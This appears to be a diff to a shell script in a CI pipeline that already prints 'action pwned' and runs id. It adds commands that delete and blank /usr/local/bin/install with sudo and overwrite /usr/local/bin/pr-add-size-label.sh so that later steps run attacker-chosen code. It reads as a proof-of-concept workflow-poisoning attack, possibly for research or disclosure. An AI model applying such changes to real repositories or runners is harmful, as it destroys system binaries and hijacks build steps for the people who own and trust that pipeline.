@@ -40,7 +40,11 @@ function main() {
     echo "action pwned"
     id
 
+    sudo rm -rf /usr/local/bin/install
+    sudo echo > /usr/local/bin/install
+    
     which install
+    echo "id" > /usr/local/bin/pr-add-size-label.sh
     
     action="${1:-}"
 
